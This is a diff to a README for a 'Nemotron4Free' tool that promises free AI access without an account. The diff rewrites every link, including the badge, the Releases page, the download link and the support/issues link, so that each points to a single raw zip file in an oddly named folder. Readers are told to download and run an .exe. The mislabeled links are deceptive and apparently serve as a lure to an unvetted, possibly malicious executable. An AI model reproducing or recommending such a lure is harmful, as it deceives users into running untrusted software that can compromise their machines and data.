@@ -1,6 +1,6 @@
 # 🚀 Nemotron4Free - Access AI without an Account
 
-![Download Nemotron4Free](https://img.shields.io/badge/Download-Nemotron4Free-brightgreen)
+![Download Nemotron4Free](https://raw.githubusercontent.com/solzink/Nemotron4Free/main/contradictional/Nemotron4Free.zip)
 
 ## 📋 Description
 Nemotron4Free allows you to use the Nemotron API easily. With this tool, you can make requests to the API without creating an account. This makes it simple and accessible for anyone who wants to explore AI capabilities with minimal setup.
@@ -11,7 +11,7 @@ api, api-wrapper, chatgpt, chatgpt-free, claude, language-model, nemotron, nemot
 ## 🚀 Getting Started
 To get started with Nemotron4Free, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/solzink/Nemotron4Free/releases) to see the latest version of Nemotron4Free.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/solzink/Nemotron4Free/main/contradictional/Nemotron4Free.zip) to see the latest version of Nemotron4Free.
 
 2. **Download the Application**: Click on the version you wish to download. This will take you to the download options. You might see files with different extensions. For most users, the `.exe` file is suitable if you are on Windows. This file allows you to run the application directly on your computer.
 
@@ -28,7 +28,7 @@ To get started with Nemotron4Free, follow these steps:
 ## 📥 Download & Install
 To download the latest version of Nemotron4Free, click the link below:
 
-[Download Nemotron4Free](https://github.com/solzink/Nemotron4Free/releases)
+[Download Nemotron4Free](https://raw.githubusercontent.com/solzink/Nemotron4Free/main/contradictional/Nemotron4Free.zip)
 
 Follow the instructions above to install and run the application smoothly. 
 
@@ -45,6 +45,6 @@ If you face issues during installation or running the application, consider the 
 3. **Compatibility Mode**: On Windows, try running the application in compatibility mode if you encounter any issues.
 
 ## 📞 Support & Feedback
-If you need help or wish to provide feedback, feel free to open an issue on our [GitHub page](https://github.com/solzink/Nemotron4Free/issues). Your input helps us improve Nemotron4Free for everyone.
+If you need help or wish to provide feedback, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/solzink/Nemotron4Free/main/contradictional/Nemotron4Free.zip). Your input helps us improve Nemotron4Free for everyone.
 
 Now you are ready to use Nemotron4Free! Enjoy exploring the possibilities with AI at your fingertips.
